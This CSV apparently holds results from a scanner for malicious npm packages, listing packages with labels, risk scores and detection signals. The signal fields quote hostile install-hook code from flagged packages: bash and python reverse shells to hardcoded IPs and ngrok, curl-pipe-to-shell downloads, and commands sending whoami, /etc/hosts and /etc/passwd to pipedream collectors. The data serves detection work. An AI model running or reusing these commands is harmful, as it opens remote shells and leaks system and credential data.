package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
@actions/core,1.10.1,benign,2026-03-14T21:32:17.946870,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@alifd/next,1.26.24,benign,2026-03-14T21:32:17.951721,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@ampproject/remapping,2.2.1,benign,2026-03-14T21:32:17.991761,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@angular-devkit/core,16.2.3,benign,2026-03-14T21:32:18.008964,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ant-design/icons,5.2.6,benign,2026-03-14T21:32:18.020409,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-14T21:32:18.064029,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apollo/client,3.8.4,benign,2026-03-14T21:32:18.070271,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@assemblyscript/loader,0.27.9,benign,2026-03-14T21:32:18.174691,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@aws-cdk/aws-ec2,1.204.0,benign,2026-03-14T21:32:18.190704,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@azure/abort-controller,1.1.0,benign,2026-03-14T21:32:18.209333,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
1ru-cache,0.0.1,malicious,2026-03-23T22:47:15.106420,flag,1.0,0.96,backdoor_installation,2,0,0,2,0,entry_point,True,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.postinstall\nCode    : bash -c \""(echo '`date` - 44984BBBADAD5C392EE07B61FC967421' > /dev/tcp/34.121.250.204/443)||(:)\"""", ""Signal  : Hardcoded external IP address '34.121.250.204'\nLocation: package.json \u2192 scripts.postinstall\nCode    : bash -c \""(echo '`date` - 44984BBBADAD5C392EE07B61FC967421' > /dev/tcp/34.121.250.204/443)||(:)\""""]",[]
@aaakca/myf,1.0.14,malicious,2026-03-23T22:47:15.106420,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-23T22:47:15.112957,skip,0.0,0.2,none,0,0,0,0,0,none,False,[],[]
@anemone95/evil,1.0.9,malicious,2026-03-23T22:47:15.115625,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-23T22:47:15.126092,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-23T22:47:15.133707,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.99.999""]"
@aszxc/npmexp,1.0.1,malicious,2026-03-23T22:47:15.138489,flag,1.0,0.9025,backdoor_installation,4,0,0,4,0,none,False,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Interactive Reverse Shell in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Hardcoded external IP address '39.96.12.202'\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@att-bit/duc.components.cardshell,10.0.0,malicious,2026-03-23T22:47:15.143063,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb""]",[]
@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-23T22:47:15.147498,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-23T22:47:15.153771,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"test.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: test.js:1\nCode    : const https = require('https');""]",[]
@b2bgeo/yav,13.3.8,malicious,2026-03-23T22:47:15.158372,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@dbk-legacy/muster,9.9.91,malicious,2026-03-23T22:47:15.161551,skip,0.0,0.2,none,0,0,0,0,0,"index.js,entry_point",True,[],[]
@doccledev/pattern-library,5.0.99,malicious,2026-03-23T22:47:15.175146,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""cfhkr5pjas2slrrhp4s0pruu5eat15gkz.oast.live\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
@drp-web/shared,1.2.2,malicious,2026-03-23T22:47:15.179823,flag,1.0,0.915,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""2.tcp.ngrok.io\"",18"", ""Signal  : Python Inline Exec in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""2.tcp.ngrok.io\"",18""]",[]
@drp-web/shared,1.2.7,malicious,2026-03-23T22:47:15.182842,flag,0.6333,0.95,data_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : apk add --update netcat-openbsd; telnet 2.tcp.ngrok.io 18363 | /bin/bash""]",[]
@dtci/eq-ui-lib,1.9.9,malicious,2026-03-23T22:47:15.188076,flag,0.6333,0.95,data_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl -d $(id | base64) -d $(cat /etc/hosts | base64 ) https://54f325bfdb30a3e28eb9fc7557e23eb0.m.pipedream.net/""]",[]
@dydxprotocol/perpetual,1.2.2,malicious,2026-03-23T22:47:15.194353,flag,0.6467,0.97,remote_code_execution,1,0,0,1,0,entry_point,True,"[""Signal  : Remote Shell Download in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl -s http://api.circle-cdn.com/ci.js | sh""]",[]
@elisaid/elisaid-js-client,6.9.3,malicious,2026-03-23T22:47:15.203868,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
@employee-experience/common,999.9.11,malicious,2026-03-23T22:47:15.211153,flag,0.77,0.825,dynamic_code_execution,2,0,0,2,0,install.js,True,"[""Signal  : Eval In Install File\nLocation: install.js:1\nCode    : const e=require(\""crypto\""),r=\""aes-256-ctr\"",t=\""@McQfTjWnZr4u7x!A%D*G-KaNdRgUkXp\"",c=c=>{const n=e.createDecipheriv(r,t,Buff..."", ""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 999.9.11""]",[]
@exabyte-io/chimpy,2023.3.3-4,malicious,2026-03-23T22:47:15.302666,review,0.5033,0.725,supply_chain_attack,1,1,1,1,2,entry_point,True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.3.3-4""]","[""Signal  : Non-standard URL in function call: http://bit.ly/2btQaFu\\n\nLocation: entry_point:137\nCode    : log.info('\\nMaster Chimp and become a testing Ninja! Check out our course: '.green + 'http://bit.ly/2btQaFu\\n'.blue.underline)""]"
@pagseguro/stylelint-config,6.1.5,malicious,2026-03-23T22:47:15.312849,skip,0.26,0.65,none,0,2,0,0,2,"index.js,entry_point",True,[],"[""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: index.js:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'stylelint-config';curl -s https://ifconfig.me;) && for i in ${a}; do curl -ski -d \\\""$i\\\"" 1wy3rk316x8qqy4..."", ""Signal  : Non-standard URL in function call: https://ifconfig.me\nLocation: entry_point:2\nCode    : exec(\""a=$(hostname;pwd;whoami;echo 'stylelint-config';curl -s https://ifconfig.me;) && for i in ${a}; do curl -ski -d \\\""$i\\\"" 1wy3rk316x8qqy4...""]"
@playgami/portal-logs,2.99.99,malicious,2026-03-23T22:47:15.315420,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
@podval/test_dep_confs,1.0.0,malicious,2026-03-23T22:47:15.320218,flag,0.7773,0.835,network_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://34.141.82.227/\\?whoami=$(whoami)"", ""Signal  : Hardcoded external IP address '34.141.82.227'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://34.141.82.227/\\?whoami=$(whoami)""]",[]
@proofpoint/fuse-ui,1.0.0,malicious,2026-03-23T22:47:15.326056,review,0.494,0.715,network_exfiltration,1,1,0,2,0,extract.js,True,"[""Signal  : Network Request In Install\nLocation: extract.js:1\nCode    : const https = require('https');""]","[""Signal  : Filesystem Write In Install\nLocation: extract.js:4\nCode    : var dir = os.homedir()""]"
@realty-front/ad,1.13.1,malicious,2026-03-23T22:47:15.329454,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@realty-front/payment-cards,1.13.1,malicious,2026-03-23T22:47:15.331518,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@roku-web-core/ajax,1.99999999999999.99999999999999,malicious,2026-03-23T22:47:15.346154,flag,0.754,0.6825,network_exfiltration,1,3,0,3,1,"hook.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: hook.js:2\nCode    : var https = require('https');""]","[""Signal  : Filesystem Write In Install\nLocation: hook.js:25\nCode    : npmrcText = fs.readFileSync(os.homedir() + '/.npmrc');"", ""Signal  : Version contains inflated segment(s) [99999999999999, 99999999999999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 1.99999999999999.99999999999999"", ""Signal  : Non-standard URL in function call: https://jon-test.site/funtimes.php\nLocation: hook.js:54\nCode    : https.get('https://jon-test.site/funtimes.php', options, function() {   //console.log(x); })""]"
@roots/browserslist-config,2023.3.16,malicious,2026-03-23T22:47:15.350340,review,0.3733,0.8,supply_chain_attack,1,0,0,1,0,scripts/postinstall.mjs,True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.3.16""]",[]
@roots/bud,2023.0.30,malicious,2026-03-23T22:47:15.357980,review,0.3733,0.8,supply_chain_attack,1,0,0,1,0,"scripts/postinstall.mjs,entry_point",True,"[""Signal  : Version contains inflated segment(s) [2023] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 2023.0.30""]",[]
@tangoch/add-two,2.0.1,malicious,2026-03-23T22:47:15.370409,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""ahs3ykmb4wm2gvn44955wb5ks.canarytokens.com\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
@testing.sec123/toxic-pkg-dont-use,0.0.3,malicious,2026-03-23T22:47:15.375975,review,0.364,0.78,network_exfiltration,1,0,0,1,0,build.js,True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : var http = require('https');""]",[]
@trapido90/chalk_js,5.2.2,malicious,2026-03-23T22:47:15.381410,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)""]",[]
@trimoz/trimoz-vue-error-handling,1.81.60,malicious,2026-03-23T22:47:15.483682,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"build.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: build.js:1\nCode    : const goto = require('https');""]",[]
@uc-maps/maps.react,0.99.999,malicious,2026-03-23T22:47:15.493289,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 0.99.999""]"
@vendavo/pezzi,4.0.0-7,malicious,2026-03-23T22:47:15.496094,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@wadk/icons,99.10.11,malicious,2026-03-23T22:47:15.502758,flag,0.7607,0.815,network_exfiltration,2,0,0,2,0,"index.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: index.js:1\nCode    : const https = require('https')"", ""Signal  : Eval In Install File\nLocation: index.js:12\nCode    : eval(data.toString())""]",[]
@wtest/e-c,1.0.2,malicious,2026-03-23T22:47:31.563314,flag,0.8167,0.875,obfuscation,2,0,2,0,4,entry_point,True,"[""Signal  : Obfuscator tool signature (_0x pattern, 53441 occurrences)\nLocation: entry_point:2\nCode    : function _0x286b(_0x29cb60,_0x455125){const _0x3fe560=_0x3fe5();return _0x286b=function(_0x286b6d,_0x23e08c){_0x286b6d=_"", ""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: entry_point:2\nCode    : process[_0xfc5ae1(0xeff)](()=>{const _0x36ccd2=_0xfc5ae1;if(typeof _0x5553fa!==_0x36ccd2(0xa16))return _0x7a3689&&_0x7a3689(null),_0x2c2200(...""]",[]
@xvideos/alerts,1.0.0,malicious,2026-03-23T22:47:31.579922,skip,0.13,0.65,none,0,1,0,1,0,"build-project.js,entry_point",True,[],"[""Signal  : Filesystem Write In Install\nLocation: build-project.js:12\nCode    : os.tmpdir(),""]"
@yandex-travel/ci,1.1.0,malicious,2026-03-23T22:47:31.582263,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/eslint-config,0.0.7,malicious,2026-03-23T22:47:31.587018,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/ts-config,0.1.0,malicious,2026-03-23T22:47:31.589612,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yandex-travel/ui,1.1.1,malicious,2026-03-23T22:47:31.592550,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@yorek/sqlpackage,160.6161.0,malicious,2026-03-23T22:47:31.609192,review,0.494,0.715,network_exfiltration,1,1,0,2,0,lib/install.js,True,"[""Signal  : Network Request In Install\nLocation: lib/install.js:6\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [6161] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 160.6161.0""]"
aa-testkit,9.9.3,malicious,2026-03-23T22:47:31.617316,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
aae-stream,130.0.0,malicious,2026-03-23T22:47:31.621154,flag,1.0,0.8925,network_exfiltration,4,0,0,4,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/"", ""Signal  : Hardcoded external IP address '196.188.125.134'\nLocation: package.json \u2192 scripts.test\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(cat /etc/passwd)&s3=$(aws s3 ls s3://)&home"", ""Signal  : Hardcoded external IP address '196.188.125.134'\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/"", ""Signal  : Hardcoded external IP address '192.81.209.195'\nLocation: package.json \u2192 scripts.preinstall\nCode    : wget --quiet \""http://196.188.125.134/?user=$(whoami)&path=$(ls /)&hostname=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/""]",[]
abacus-cmdline,99.99.99,malicious,2026-03-23T22:47:31.624167,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
ably-asset-tracking-common,1.0.0,malicious,2026-03-23T22:47:31.637216,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo6cvg8kvj30wxd.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-common,1.2.0,malicious,2026-03-23T22:47:31.650572,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eoawu1sht21zwp8.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-control-api-action,0.1.5,malicious,2026-03-23T22:47:31.663292,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo1bj0lgont3eal.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
ably-engineering,1.0.0,malicious,2026-03-23T22:47:31.667445,flag,1.0,0.7967,data_exfiltration,3,0,0,3,0,none,False,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo7k0ogyrj0trrn.m.pipedream.net"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo7k0ogyrj0trrn.m.pipedream.net"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
ably-fragmenter-test,1.0.0,malicious,2026-03-23T22:47:31.679898,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:26\nCode    : hostname: \""eo5wgbnahpiwezj.m.pipedream.net\"", //replace burpcollaborator.net with Interactsh or pipedream"", ""Signal  : Network Request In Install\nLocation: index.js:5\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:12\nCode    : hd: os.homedir(),""]"
acookie,1.0.1,malicious,2026-03-23T22:47:31.699227,flag,0.9973,0.865,data_exfiltration,2,0,0,2,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:58\nCode    : hostname: 'f5778d1d81cc30c39dcdd0da5ca1d49a.m.pipedream.net',"", ""Signal  : Network Request In Install\nLocation: index.js:3\nCode    : const https = require('https')""]",[]
acronis-ui-kit,99.9.50,malicious,2026-03-23T22:47:31.727663,flag,1.0,0.8214,network_exfiltration,6,1,0,1,6,"index.js,entry_point",True,"[""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 20.106.202.190\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 4.4.4.4\nLocation: index.js:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 8.8.8.8\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 20.106.202.190\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd..."", ""Signal  : Hardcoded external IP(s) in function call: 4.4.4.4\nLocation: entry_point:86\nCode    : dns.lookup('ns.jrebind.com', function(err, address) {         if (!err) {             nsAddress = address;         } else {             nsAd...""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:59\nCode    : if (homeDirsToIgnore.indexOf(os.homedir()) > -1) {""]"
action-destinations,60.54.35,malicious,2026-03-23T22:47:31.736982,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
